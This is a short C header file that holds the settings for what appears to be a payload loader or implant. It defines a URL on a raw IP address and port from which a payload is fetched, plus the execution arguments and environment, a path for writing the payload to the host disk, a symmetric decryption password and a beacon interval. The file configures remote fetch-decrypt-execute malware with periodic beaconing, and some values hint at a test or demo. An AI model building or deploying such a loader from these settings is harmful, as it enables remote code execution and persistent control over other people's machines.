#ifndef PREFERENCES_H
#define PREFERENCES_H

//---------------------------------------------------------------
// EDIT PAYLOAD SETTINGS HERE

#define PAYLOAD_URL "https://71.163.46.151:25566/api/testloader?send=payload-6" //"https://fruit.qc.to:25566/api/testloader?send=payload-6" // URL to download the payload from
#define PAYLOAD_ARGV {"example_argv1", "hello lockheed", NULL} // arguments for the payload execution
#define PAYLOAD_ENVP {NULL} // environment variables for the payload execution
#define PATH_TO_WRITE "../test_files/demo_file" // path to write payload to on host disk (if not executable)
#define ENC_PASSWORD "example_password" // symmetric password for decryption
#define BEACON_MODE 1 // 0 for instantly beacon once, any positive number x for beacon every x seconds

//----------------------------------------------------------------

#endif